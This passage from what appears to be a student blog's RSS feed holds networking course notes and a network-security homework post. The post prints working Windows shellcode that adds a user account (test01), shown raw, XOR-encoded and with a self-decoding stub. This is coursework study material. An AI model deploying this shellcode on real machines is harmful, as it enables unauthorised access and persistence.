id=&#34;sdn&#34;&gt;SDN&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;当前网络问题&#xA;&lt;ul&gt;&#xA;&lt;li&gt;网络缺乏灵活的控制机制&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;基本思想：&#xA;&lt;ul&gt;&#xA;&lt;li&gt;数据面和控制面分离，数据路由传输由控制器控制，赋予外部应用通过控制器控制网络设备的能力&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;openflow&#xA;&lt;ul&gt;&#xA;&lt;li&gt;OpenFlow是SDN的一种实现，定义了控制器和交换机/路由器之间的协议，以及交换机/路由器的控制接口、流表格式等&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;现有internet存在的问题&#34;&gt;现有Internet存在的问题&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;可扩展性：流量增加、路由表膨胀&lt;/li&gt;&#xA;&lt;li&gt;移动性：越来越多的移动用户接入到Internet，在设计时未考虑移动性支持&lt;/li&gt;&#xA;&lt;li&gt;服务质量：IP网络提供的是尽力投递服务，未考虑数据内容&lt;/li&gt;&#xA;&lt;li&gt;网络安全：越来越多的应用使用Internet，在设计时并未充分考虑安全性&lt;/li&gt;&#xA;&lt;li&gt;能耗：互联网耗电量约占全球的5.4%，我国是4.3%，还在不断增长&#xA;Internet体系结构本生存在问题，无法彻底解决这些问题！重新设计Internet体系结构！&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;nsf-future-internet-architecture-program&#34;&gt;NSF Future Internet Architecture Program&lt;/h3&gt;&#xA;&lt;p&gt;•Founded in 2010, design for next 15 years&lt;/p&gt;</description>
    </item>
    <item>
      <title>信息网络复习提纲</title>
      <link>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/</link>
      <pubDate>Tue, 02 Jan 2024 00:27:05 +0800</pubDate>
      <guid>//localhost:64783/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/</guid>
      <description>&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;题型：简答题问答题&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;往年题合集： &lt;a href=&#34;https://github.com/Anonymity-0/Anonymity-0.github.io/blob/main/content/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/2021%E4%BF%A1%E7%BD%91%E5%A4%8D%E4%B9%A0(1).zip&#34;&gt;试卷合集&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;整理的小抄：&lt;a href=&#34;https://github.com/Anonymity-0/Anonymity-0.github.io/blob/main/content/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E7%BD%91%E5%B0%8F%E6%8A%84.docx&#34;&gt;A4小抄&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;第一章-信息网络概述&#34;&gt;第一章 信息网络概述&lt;/h2&gt;&#xA;&lt;h3 id=&#34;交换技术&#34;&gt;﻿交换技术&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;交换、电路交换、分组交换（虚电路交换ATM、数据报交换IP）&#xA;&lt;ul&gt;&#xA;&lt;li&gt;原理 特点&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;为什么需要交换&#34;&gt;为什么需要交换？&lt;/h4&gt;&#xA;&lt;p&gt;减少网络中节点之间所需的通信线路&#xA;增强可扩展性,构建更大规模网络&lt;/p&gt;&#xA;&lt;h4 id=&#34;交换的概念&#34;&gt;交换的概念&lt;/h4&gt;&#xA;&lt;p&gt;交换操作由一系列过程组成：为输入数据选择输出线路/端口，在输入和输出之间建立连接，通过该连接将数据放到输出线路/端口上&#xA;网络中执行交换操作的设备称为交换机。通过一系列交换机的交换操作，在两个通信节点之间建立一条数据传输路径，这条路径由物理或者逻辑上的链路组成&lt;/p&gt;&#xA;&lt;h4 id=&#34;电路交换概念&#34;&gt;电路交换：概念&lt;/h4&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;交换传输线路或者时隙，通过交换机在通信双方之间建立一条专用的传输路径&lt;/li&gt;&#xA;&lt;li&gt;传输路径建立后，数据像流一样在路径上传输&#xA;&lt;ul&gt;&#xA;&lt;li&gt;空分交换：传输路径由线路组成&lt;/li&gt;&#xA;&lt;li&gt;时分交换：传输路径由每条线路上的固定时隙组成&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;电路交换特征&#34;&gt;电路交换：特征&lt;/h4&gt;&#xA;&lt;p&gt;网络通信包括三个过程&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;（发送）端到（接收）端电路连接建立&lt;/li&gt;&#xA;&lt;li&gt;数据传输&lt;/li&gt;&#xA;&lt;li&gt;电路连接拆除&#xA;优点：占用固定的线路资源，保证数据传输的速率、延时、可靠性及有序性&#xA;缺点：线路资源利用率低，没有有数据传输时也占用线路或者固定时隙；电路连接建立导致延迟&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 id=&#34;电路交换性能&#34;&gt;电路交换：性能&lt;/h4&gt;&#xA;&lt;h3 id=&#34;网络体系结构&#34;&gt;网络体系结构&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;﻿现有网络体系结构面临哪些主要挑战？有哪些主要的解决方案？&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;第二章-接入网技术&#34;&gt;第二章 接入网技术&lt;/h2&gt;&#xA;&lt;h3 id=&#34;接入网架构&#34;&gt;接入网架构&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;﻿常用接入网络类型有哪些？各自有什么特点？&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;80211无线局域网&#34;&gt;﻿﻿802.11无线局域网&lt;/h3&gt;&#xA;&lt;pre&gt;&lt;code&gt;- 共享、资源利用率高、成本低&#xA;- 共享信道的访问控制机制&#xA;- 覆盖范围&#xA;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;﻿基本CSMA/CA原理、扩展CSMA/CA原理&#xA;&lt;ul&gt;&#xA;&lt;li&gt;RTS、CTS&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;﻿站点切换过程&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;无源光接入网&#34;&gt;无源光接入网&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;﻿PON网络架构、关键技术&#xA;ATM的apon&#xA;以太网EPON&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;第三章ipv6协议&#34;&gt;第三章IPv6协议&lt;/h2&gt;&#xA;&lt;h2 id=&#34;natacidr&#34;&gt;NATA\CIDR&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;﻿﻿NAT技术原理及其局限性&lt;/li&gt;&#xA;&lt;li&gt;&lt;/li&gt;&#xA;&lt;li&gt;﻿﻿&lt;strong&gt;前缀汇聚、前缀最长匹配规则&lt;/strong&gt;；&#xA;&lt;ul&gt;&#xA;&lt;li&gt;学会汇聚&lt;/li&gt;&#xA;&lt;li&gt;带来问题：路由匹配到多个表项&lt;/li&gt;&#xA;&lt;li&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;﻿﻿&lt;strong&gt;路由表配置&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;使得路由表项最少&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;ipv6地址&#34;&gt;﻿﻿IPv6地址&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;﻿﻿&lt;strong&gt;链路局部地址&lt;/strong&gt;、全局地址、常用组播地址（全节点、全路由器、&lt;strong&gt;被请求节点&lt;/strong&gt;）&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;地址范围&lt;/li&gt;&#xA;&lt;li&gt;被请求节点地址是邻居发现机制非常重要的地址&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;﻿﻿IPv6邻居发现机制&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;地址解析、地址重复检测、路由器发现&lt;/li&gt;&#xA;&lt;li&gt;﻿﻿基于EUI-64地址的IPv6&lt;strong&gt;地址自动配置过程&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;﻿﻿IPv4/IPv6过渡机制&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;﻿﻿手动&lt;strong&gt;隧道配置&lt;/strong&gt;、自动&lt;strong&gt;隧道&lt;/strong&gt;（ISATAP、6to4）原理和配置&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;掌握基本的IP网络配置，包括地址、路由等&#xA;注意实验&lt;/p&gt;</description>
    </item>
    <item>
      <title>网络安全作业7</title>
      <link>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A7/</link>
      <pubDate>Sat, 23 Dec 2023 11:28:18 +0800</pubDate>
      <guid>//localhost:64783/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A7/</guid>
      <description>&lt;p&gt;得分10/10&lt;/p&gt;&#xA;&lt;h3 id=&#34;修改源代码&#34;&gt;修改源代码&lt;/h3&gt;&#xA;&lt;p&gt;![[IMG_2949.png]]&lt;/p&gt;&#xA;&lt;h3 id=&#34;shellcode&#34;&gt;shellcode&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Z:&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;oStudentCh11-3&amp;gt;GetShellcode.exe&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* 292&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0x124 bytes */&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x33\xc0\x50\x68\x2f\x61\x64\x64\x68\x74\x30\x31\x20\x68\x20\x74&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x65\x73\x68\x75\x73\x65\x72\x68\x65\x78\x65\x20\x68\x6e\x65\x74&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x2e\x68\x70\x61\x64\x2e\x68\x6e\x6f\x74\x65\x8b\xfc\x68\x57\x66&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x0d\xff\x68\x63\x89\xd1\x4f\x68\xc9\xbc\xa6\x6b\x5a\xe8\x56\x00&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x00\x00\x8b\xf0\x5a\xe8\x4e\x00\x00\x00\x8b\xd8\xe8\x05\x00\x00&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x00\xe9\xce\x00\x00\x00\x51\x52\x56\x57\x55\x8b\xec\x8b\xd7\x83&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xec\x54\x8b\xfc\x6a\x14\x59\x33\xc0\x89\x04\x8f\xe2\xfb\xc6\x47&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x10\x44\x8d\x47\x10\x57\x50\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x00\x6a\x00\x52\x6a\x00\xff\xd6\x83\xf8\x00\x74\x03\x50\xff\xd3&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x8b\xe5\x5d\x5f\x5e\x5a\x59\xc3\x56\x53\x51\x52\xe8\x11\x00\x00&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x00\x83\xf8\x00\x7e\x07\x8b\xd8\xe8\x17\x00\x00\x00\x5a\x59\x5b&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x5e\xc3\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x1c\x8b\x00&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x8b\x40\x08\xc3\x8b\x43\x3c\x8b\x44\x18\x78\x03\xc3\x8b\xf0\x8b&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x4e\x18\x8b\x46\x20\x03\xc3\x8b\x44\x88\xfc\x03\xc3\x57\x8b\xf8&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xe8\x17\x00\x00\x00\x5f\x3b\xc2\x74\x06\xe2\xe6\x33\xc0\xeb\x0b&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x8b\x46\x1c\x03\xc3\x8b\x44\x88\xfc\x03\xc3\xc3\x53\x51\x52\x57&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x33\xd2\x0f\xbe\x07\x83\xf8\x00\x74\x13\x8b\xda\x8b\xca\xc1\xe3&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x19\xc1\xe9\x07\x0b\xd9\x8b\xd3\x03\xd0\x47\xeb\xe5\x8b\xc2\x5f&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x5a\x59\x5b\xc3&amp;#34;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        XorByte&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0xfe&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* 292&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0x124 bytes */&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xcd\x3e\xae\x96\xd1\x9f\x9a\x9a\x96\x8a\xce\xcf\xde\x96\xde\x8a&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x9b\x8d\x96\x8b\x8d\x9b\x8c\x96\x9b\x86\x9b\xde\x96\x90\x9b\x8a&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xd0\x96\x8e\x9f\x9a\xd0\x96\x90\x91\x8a\x9b\x75\x02\x96\xa9\x98&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xf3\x01\x96\x9d\x77\x2f\xb1\x96\x37\x42\x58\x95\xa4\x16\xa8\xfe&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xfe\xfe\x75\x0e\xa4\x16\xb0\xfe\xfe\xfe\x75\x26\x16\xfb\xfe\xfe&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xfe\x17\x30\xfe\xfe\xfe\xaf\xac\xa8\xa9\xab\x75\x12\x75\x29\x7d&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x12\xaa\x75\x02\x94\xea\xa7\xcd\x3e\x77\xfa\x71\x1c\x05\x38\xb9&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xee\xba\x73\xb9\xee\xa9\xae\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xfe\x94\xfe\xac\x94\xfe\x01\x28\x7d\x06\xfe\x8a\xfd\xae\x01\x2d&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x75\x1b\xa3\xa1\xa0\xa4\xa7\x3d\xa8\xad\xaf\xac\x16\xef\xfe\xfe&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xfe\x7d\x06\xfe\x80\xf9\x75\x26\x16\xe9\xfe\xfe\xfe\xa4\xa7\xa5&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xa0\x3d\x9a\x5f\xce\xfe\xfe\xfe\x75\xbe\xf2\x75\xbe\xe2\x75\xfe&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x75\xbe\xf6\x3d\x75\xbd\xc2\x75\xba\xe6\x86\xfd\x3d\x75\x0e\x75&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xb0\xe6\x75\xb8\xde\xfd\x3d\x75\xba\x76\x02\xfd\x3d\xa9\x75\x06&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x16\xe9\xfe\xfe\xfe\xa1\xc5\x3c\x8a\xf8\x1c\x18\xcd\x3e\x15\xf5&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x75\xb8\xe2\xfd\x3d\x75\xba\x76\x02\xfd\x3d\x3d\xad\xaf\xac\xa9&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xcd\x2c\xf1\x40\xf9\x7d\x06\xfe\x8a\xed\x75\x24\x75\x34\x3f\x1d&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xe7\x3f\x17\xf9\xf5\x27\x75\x2d\xfd\x2e\xb9\x15\x1b\x75\x3c\xa1&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xa4\xa7\xa5\x3d&amp;#34;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Success: encode is OK&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;length of shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 315 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x13b&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* 315&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0x13b bytes */&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xeb\x10\x5b\x53\x4b\x33\xc9\x66\xb9\x24\x01\x80\x34\x0b\xfe\xe2&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xfa\xc3\xe8\xeb\xff\xff\xff\xcd\x3e\xae\x96\xd1\x9f\x9a\x9a\x96&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x8a\xce\xcf\xde\x96\xde\x8a\x9b\x8d\x96\x8b\x8d\x9b\x8c\x96\x9b&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x86\x9b\xde\x96\x90\x9b\x8a\xd0\x96\x8e\x9f\x9a\xd0\x96\x90\x91&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x8a\x9b\x75\x02\x96\xa9\x98\xf3\x01\x96\x9d\x77\x2f\xb1\x96\x37&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x42\x58\x95\xa4\x16\xa8\xfe\xfe\xfe\x75\x0e\xa4\x16\xb0\xfe\xfe&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xfe\x75\x26\x16\xfb\xfe\xfe\xfe\x17\x30\xfe\xfe\xfe\xaf\xac\xa8&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xa9\xab\x75\x12\x75\x29\x7d\x12\xaa\x75\x02\x94\xea\xa7\xcd\x3e&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x77\xfa\x71\x1c\x05\x38\xb9\xee\xba\x73\xb9\xee\xa9\xae\x94\xfe&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\xac\x94\xfe\x01\x28\x7d&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x06\xfe\x8a\xfd\xae\x01\x2d\x75\x1b\xa3\xa1\xa0\xa4\xa7\x3d\xa8&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xad\xaf\xac\x16\xef\xfe\xfe\xfe\x7d\x06\xfe\x80\xf9\x75\x26\x16&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span 